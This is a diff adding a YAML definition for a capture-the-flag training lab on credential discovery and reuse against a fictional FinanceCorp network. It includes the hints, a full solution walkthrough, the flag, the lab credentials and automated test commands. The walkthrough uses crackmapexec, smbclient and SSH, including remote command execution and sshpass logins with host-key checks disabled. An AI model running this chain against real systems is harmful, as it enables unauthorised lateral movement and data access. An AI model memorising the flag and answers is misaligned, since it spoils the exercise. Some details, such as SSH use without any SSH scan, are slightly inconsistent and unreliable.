@@ -1,0 +1,406 @@
+name: Credential Discovery and Reuse Chain
+description: Execute the complete credential discovery and reuse chain on FinanceCorp's infrastructure to demonstrate the attack path.
+difficulty: intermediate
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - find credentials via enumeration and reuse
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your credential reuse testing for FinanceCorp has demonstrated significant lateral 
+  movement capabilities. James Mitchell wants to see the complete attack chain: from 
+  initial enumeration through credential discovery to multi-service reuse.
+  
+  The credential discovery and reuse chain demonstrates how enumeration leads to 
+  credential discovery, which then enables lateral movement. FinanceCorp needs to 
+  understand this complete attack path to prioritize remediation efforts.
+  
+  Your objective: Execute the complete credential discovery and reuse chain against 
+  FinanceCorp's infrastructure. From enumeration to credential discovery to multi-service 
+  reuse, demonstrate the full attack path and security impact.
+
+flag: "OCR{cr3d_ch41n}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    text: |
+      ## Understanding the Credential Discovery and Reuse Chain
+
+      A **credential chain** is the complete attack path from initial
+      enumeration through credential discovery to lateral movement via
+      credential reuse. This represents how real attackers systematically
+      compromise networks.
+
+      ### The Attack Chain
+
+      ```
+      Enumeration --> Credential Discovery --> Credential Reuse --> Access
+      ```
+
+      Each phase builds on the previous:
+
+      1. **Enumeration** - Discover services, shares, and information leaks
+      2. **Credential Discovery** - Find or deduce valid credentials
+      3. **Credential Reuse** - Test discovered credentials on other services
+      4. **Access** - Use successful authentication to retrieve sensitive data
+
+      ### Services in This Lab
+
+      | Service | Port | Purpose |
+      |---------|------|---------|
+      | SMB | 445 | File shares with enumerable information |
+      | RDP | 3389 | Remote Desktop for graphical access |
+      | LDAP | 389 | Directory services with user information |
+
+      ### LDAP - A New Service
+
+      **LDAP (Lightweight Directory Access Protocol)** on port 389 is used
+      for directory services. It stores user accounts, groups, and
+      organizational information. LDAP enumeration can reveal:
+      - Usernames and account details
+      - Group memberships
+      - Organizational structure
+      - Sometimes even password-related attributes
+
+      ### Your Goal
+
+      Chain from enumeration through credential discovery to multi-service
+      reuse. Use information from one service to gain access to others.
+
+  - id: 2
+    unlock_after_minutes: 5
+    text: |
+      ## Tools for the Credential Chain
+
+      ### Enumeration Tools
+
+      **nmap - Service Discovery:**
+      ```bash
+      nmap -sV -p 389,445,3389 <target>
+      ```
+
+      **ldapsearch - LDAP Enumeration:**
+      ```bash
+      sudo apt install ldap-utils
+
+      # Anonymous LDAP query
+      ldapsearch -x -H ldap://<target> -b "dc=example,dc=com"
+
+      # Search for user objects
+      ldapsearch -x -H ldap://<target> -b "dc=example,dc=com" "(objectClass=person)"
+      ```
+
+      **Key ldapsearch flags:**
+      | Flag | Purpose |
+      |------|---------|
+      | `-x` | Simple authentication |
+      | `-H` | LDAP server URL |
+      | `-b` | Search base DN |
+      | `-D` | Bind DN (for authenticated queries) |
+      | `-w` | Bind password |
+
+      ### Credential Testing Tools
+
+      **smbclient:**
+      ```bash
+      smbclient -L //<target> -U <user>%<pass>
+      ```
+
+      **crackmapexec (multi-protocol):**
+      ```bash
+      crackmapexec smb <target> -u <user> -p <pass>
+      crackmapexec rdp <target> -u <user> -p <pass>
+      crackmapexec ldap <target> -u <user> -p <pass>
+      ```
+
+      **xfreerdp:**
+      ```bash
+      xfreerdp /v:<target> /u:<user> /p:<pass> /cert:ignore
+      ```
+
+      ### enum4linux - Combined SMB/LDAP Enumeration
+      ```bash
+      sudo apt install enum4linux
+
+      enum4linux -a <target>
+      ```
+
+      This tool combines SMB and LDAP enumeration to extract
+      users, shares, groups, and policies.
+
+  - id: 3
+    unlock_after_minutes: 10
+    text: |
+      ## Practical Credential Chain Examples
+
+      ### Step 1: Service Discovery
+      ```bash
+      nmap -sV -p 389,445,3389 <target>
+      ```
+
+      Expected output:
+      ```
+      PORT     STATE SERVICE       VERSION
+      389/tcp  open  ldap          OpenLDAP
+      445/tcp  open  netbios-ssn   Samba smbd 4.x
+      3389/tcp open  ms-wbt-server xrdp
+      ```
+
+      ### Step 2: LDAP Enumeration
+      ```bash
+      # Try anonymous LDAP query to discover the directory structure
+      ldapsearch -x -H ldap://<target> -s base namingContexts
+      ```
+
+      This reveals the base DN (e.g., `dc=financecorp,dc=local`).
+
+      ```bash
+      # Enumerate all objects
+      ldapsearch -x -H ldap://<target> -b "dc=financecorp,dc=local"
+
+      # Look for user accounts
+      ldapsearch -x -H ldap://<target> -b "dc=financecorp,dc=local" "(objectClass=person)" cn uid
+      ```
+
+      ### Step 3: SMB Enumeration
+      ```bash
+      # Try anonymous share listing
+      smbclient -L //<target> -N
+
+      # Use enum4linux for comprehensive enumeration
+      enum4linux -a <target>
+      ```
+
+      ### Step 4: Test Discovered Credentials
+      ```bash
+      # Test credentials on SMB
+      crackmapexec smb <target> -u admin -p password123
+
+      # Test on LDAP
+      crackmapexec ldap <target> -u admin -p password123
+
+      # Test on RDP
+      crackmapexec rdp <target> -u admin -p password123
+      ```
+
+      ### Key Insight
+
+      The chain works by: LDAP/SMB enumeration reveals usernames -->
+      test common passwords --> reuse valid credentials across services.
+
+  - id: 4
+    unlock_after_minutes: 15
+    text: |
+      ## Step-by-Step Credential Chain Workflow
+
+      ### Phase 1: Reconnaissance and Service Discovery
+      ```bash
+      # Full port scan
+      nmap -sV -p 389,445,3389 <target>
+      ```
+
+      ### Phase 2: LDAP Enumeration
+      ```bash
+      # Discover directory base
+      ldapsearch -x -H ldap://<target> -s base namingContexts
+
+      # Enumerate users
+      ldapsearch -x -H ldap://<target> -b "dc=financecorp,dc=local" \
+        "(objectClass=person)" cn uid userPassword description
+      ```
+
+      Look for:
+      - Usernames (cn, uid, sAMAccountName)
+      - Descriptions that may contain password hints
+      - Any exposed password attributes
+
+      ### Phase 3: SMB Enumeration
+      ```bash
+      # List shares
+      smbclient -L //<target> -U admin%password123
+
+      # Access the private share
+      smbclient //<target>/private -U admin%password123
+      smb: \> ls
+      smb: \> recurse ON
+      smb: \> ls
+      smb: \> exit
+      ```
+
+      ### Phase 4: Credential Reuse Testing
+      ```bash
+      # Test credentials across all services
+      crackmapexec smb <target> -u admin -p password123
+      crackmapexec ldap <target> -u admin -p password123
+      crackmapexec rdp <target> -u admin -p password123
+      ```
+
+      ### Phase 5: Flag Retrieval
+      ```bash
+      # Connect via SSH
+      ssh admin@<target>
+      # Password: password123
+      cat /tmp/private/flag.txt
+      ```
+
+      The flag is at `/tmp/private/flag.txt`. SSH provides the most
+      direct path to retrieve it.
+
+  - id: 5
+    unlock_after_minutes: 20
+    text: |
+      ## Exact Commands to Solve This Lab
+
+      ### 1. Discover Services
+      ```bash
+      nmap -sV -p 389,445,3389 <target>
+      ```
+
+      ### 2. Enumerate LDAP
+      ```bash
+      ldapsearch -x -H ldap://<target> -s base namingContexts
+      ldapsearch -x -H ldap://<target> -b "dc=financecorp,dc=local"
+      ```
+
+      ### 3. Test Credentials on All Services
+      ```bash
+      crackmapexec smb <target> -u admin -p password123
+      crackmapexec ldap <target> -u admin -p password123
+      crackmapexec rdp <target> -u admin -p password123
+      ```
+
+      ### 4. Access SMB Shares
+      ```bash
+      smbclient -L //<target> -U admin%password123
+      smbclient //<target>/private -U admin%password123 -c "ls"
+      ```
+
+      ### 5. Connect via SSH and Read Flag
+      ```bash
+      ssh admin@<target>
+      # Password: password123
+      cat /tmp/private/flag.txt
+      ```
+
+      ### Alternative: Authenticated LDAP Query for Flag
+      ```bash
+      ldapsearch -x -H ldap://<target> -D "cn=admin,dc=financecorp,dc=local" \
+        -w password123 -b "dc=financecorp,dc=local"
+      ```
+
+      ### Alternative: CrackMapExec Command Execution
+      ```bash
+      crackmapexec ssh <target> -u admin -p password123 -x "cat /tmp/private/flag.txt"
+      ```
+
+      ### Alternative: Use enum4linux for Full Enumeration
+      ```bash
+      enum4linux -a <target>
+      ```
+
+  - id: 6
+    unlock_after_minutes: 25
+    text: |
+      ## Complete Solution Walkthrough
+
+      ### Full Command Sequence
+
+      ```bash
+      # Step 1: Identify all services
+      nmap -sV -p 389,445,3389 <target>
+      # Output:
+      #   389/tcp  open  ldap          OpenLDAP
+      #   445/tcp  open  netbios-ssn   Samba smbd 4.x
+      #   3389/tcp open  ms-wbt-server xrdp
+
+      # Step 2: Enumerate LDAP for user information
+      ldapsearch -x -H ldap://<target> -s base namingContexts
+      # Output: namingContexts: dc=financecorp,dc=local
+
+      ldapsearch -x -H ldap://<target> -b "dc=financecorp,dc=local" "(objectClass=person)"
+      # Reveals user accounts, including "admin"
+
+      # Step 3: Test credentials on SMB
+      crackmapexec smb <target> -u admin -p password123
+      # Output: SMB  <target>  445  [+] admin:password123
+
+      # Step 4: Test credentials on LDAP
+      crackmapexec ldap <target> -u admin -p password123
+      # Output: LDAP  <target>  389  [+] admin:password123
+
+      # Step 5: Test credentials on RDP
+      crackmapexec rdp <target> -u admin -p password123
+      # Output: RDP  <target>  3389  [+] admin:password123
+
+      # Step 6: Access SMB shares
+      smbclient -L //<target> -U admin%password123
+      # Shows "private" share
+
+      # Step 7: Connect via SSH and read flag
+      ssh admin@<target>
+      # Password: password123
+      # cat /tmp/private/flag.txt
+      # Output: OCR{...}
+      ```
+
+      ### The Complete Chain
+
+      ```
+      LDAP Enumeration    --> Discovered "admin" username
+      SMB Credential Test --> admin:password123 works on SMB
+      LDAP Credential Test --> Same credentials work on LDAP
+      RDP Credential Test  --> Same credentials work on RDP
+      SSH Access           --> Read /tmp/private/flag.txt
+      ```
+
+      ### Summary
+
+      | Phase | Action | Tool | Result |
+      |-------|--------|------|--------|
+      | Recon | Port scan | `nmap` | Found 3 services |
+      | Enum | LDAP query | `ldapsearch` | Found admin user |
+      | Cred Test | SMB auth | `crackmapexec smb` | admin:password123 |
+      | Reuse | LDAP auth | `crackmapexec ldap` | Same creds work |
+      | Reuse | RDP auth | `crackmapexec rdp` | Same creds work |
+      | Access | SSH session | `ssh` | Read flag |
+
+      ### Key Takeaways
+
+      - The credential chain demonstrates the full attack path:
+        enumeration to discovery to reuse
+      - LDAP enumeration revealed the username, SMB confirmed the password,
+        and SSH provided the access path to the flag
+      - The same credentials `admin:password123` worked across all three
+        services (SMB, LDAP, RDP)
+      - In real assessments, this chain is the standard methodology for
+        lateral movement in Windows/Active Directory environments
+      - Submit the flag value in the format `OCR{...}`
+
+credentials:
+  - username: "admin"
+    password: "password123"
+    role: "admin"
+    description: "admin credentials"
+
+workbook: "wiki/range/winpt/CH08_Credential_Reuse/04_Credential_Discovery_and_Reuse_Chain/"
+
+test:
+  steps:
+    - name: "Verify SMB, RDP, and LDAP services are running"
+      command: "nmap -sV -p 389,445,3389 {target.target}"
+      expect: "445/tcp"
+
+    - name: "Verify LDAP anonymous bind is available"
+      command: "ldapsearch -x -H ldap://{target.target} -s base namingContexts 2>&1"
+      expect: "namingContexts"
+
+    - name: "Verify SMB credentials with crackmapexec"
+      command: "crackmapexec smb {target.target} -u {cred.admin.user} -p {cred.admin.pass} 2>&1"
+      expect: "+"
+
+    - name: "Retrieve flag via SSH credential reuse"
+      command: "sshpass -p '{cred.admin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.admin.user}@{target.target} 'cat /tmp/private/flag.txt' 2>/dev/null"
+      expect: "OCR{cr3d_ch41n}"
